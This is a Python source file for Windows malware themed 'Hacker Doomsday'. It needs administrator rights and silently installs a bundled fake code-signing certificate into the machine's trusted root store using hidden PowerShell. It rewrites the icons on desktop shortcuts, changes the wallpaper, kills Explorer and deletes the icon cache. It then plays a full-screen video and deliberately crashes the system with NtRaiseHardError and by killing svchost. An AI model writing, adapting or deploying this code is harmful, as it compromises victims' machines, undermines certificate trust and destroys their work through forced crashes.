import ctypes
import os
import sys
import time
import threading
import psutil
import subprocess
import winreg
import pythoncom
import pygame
import shutil
from win32com.shell import shell, shellcon
from moviepy.editor import VideoFileClip

# --- UPDATED RESOURCE PATH FOR BUNDLED FILES ---
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    
    # Check if the file is in 'resources' subfolder or root
    res_sub = os.path.join(base_path, "resources", relative_path)
    res_root = os.path.join(base_path, relative_path)
    
    return res_sub if os.path.exists(res_sub) else res_root

# --- CONFIG ---
VIDEO = resource_path("Hacker.mp4")
ICON  = resource_path("appicon.ico")
BG    = resource_path("bg.jpg")
CERT  = resource_path("fake_cert.pfx") # Path to bundled cert
BACKUP_REG_KEY = r"Software\HackerDoomsdayIconBackup"

def install_self_trust():
    """Silently installs the bundled PFX so the PC trusts 'Microsoft Technologies'."""
    password = "1234"
    if os.path.exists(CERT):
        # Hidden PowerShell command to import the PFX into the Trusted Root
        cmd = (
            f'powershell -WindowStyle Hidden -Command '
            f'"$p = ConvertTo-SecureString -String \'{password}\' -Force -AsPlainText; '
            f'Import-PfxCertificate -FilePath \'{CERT}\' -CertStoreLocation Cert:\\LocalMachine\\Root -Password $p"'
        )
        subprocess.run(cmd, shell=True, capture_output=True)

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def purge_icon_cache():
    """Kills explorer and nukes the cache files."""
    try:
        subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"], capture_output=True)
        time.sleep(2)
        local_appdata = os.environ['LOCALAPPDATA']
        explorer_path = os.path.join(local_appdata, "Microsoft", "Windows", "Explorer")
        if os.path.exists(explorer_path):
            for f in os.listdir(explorer_path):
                if "iconcache" in f:
                    try: os.remove(os.path.join(explorer_path, f))
                    except: pass
        subprocess.Popen(["explorer.exe"])
    except:
        subprocess.Popen(["explorer.exe"])

def BSOD():
    """Triggers a system crash."""
    ntdll = ctypes.windll.ntdll
    prev = ctypes.c_ulong(0)
    ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(prev))
    response = ctypes.c_ulong(0)
    ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(response))
    os.system("taskkill /F /IM svchost.exe")

def replace_icons(ico_path):
    pythoncom.CoInitialize()
    safe_ico = os.path.join(os.environ["PUBLIC"], "hacker_sys.ico")
    shutil.copy2(ico_path, safe_ico)

    desktops = [os.path.join(os.environ["USERPROFILE"], "Desktop"), os.path.join(os.environ["PUBLIC"], "Desktop")]
    
    for folder in desktops:
        if not os.path.exists(folder): continue
        for filename in os.listdir(folder):
            if filename.lower().endswith(".lnk"):
                lnk_path = os.path.join(folder, filename)
                try:
                    ctypes.windll.kernel32.SetFileAttributesW(lnk_path, 128)
                    shortcut = pythoncom.CoCreateInstance(shell.CLSID_ShellLink, None, pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink)
                    persist = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
                    persist.Load(lnk_path)
                    shortcut.SetIconLocation(safe_ico, 0)
                    persist.Save(lnk_path, True)
                except: continue

    if os.path.exists(BG):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, BG, 3)
    
    purge_icon_cache()
    pythoncom.CoUninitialize()

def play_video_then_bsod(video_path):
    if not os.path.exists(video_path): return
    
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    sw, sh = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)

    clip = VideoFileClip(video_path).resize((sw, sh))
    audio_path = video_path + "_tmp.mp3"
    clip.audio.write_audiofile(audio_path, logger=None)

    pygame.display.init()
    pygame.mixer.init()
    screen = pygame.display.set_mode((sw, sh), pygame.NOFRAME)
    hwnd = pygame.display.get_wm_info()["window"]
    user32.SetWindowPos(hwnd, -1, 0, 0, sw, sh, 0x0040) # Always on top

    pygame.mixer.music.load(audio_path)
    pygame.mixer.music.play()

    for frame in clip.iter_frames(fps=clip.fps, dtype="uint8"):
        for event in pygame.event.get(): pass 
        surf = pygame.surfarray.make_surface(frame.swapaxes(0, 1))
        screen.blit(surf, (0, 0))
        pygame.display.flip()
        time.sleep(1/clip.fps)

    pygame.quit()
    if os.path.exists(audio_path): os.remove(audio_path)
    BSOD()

if __name__ == "__main__":
    if not is_admin():
        sys.exit()

    # Silently install the bundled certificate into the PC trust store
    try: install_self_trust()
    except: pass

    replace_icons(ICON)
    play_video_then_bsod(VIDEO)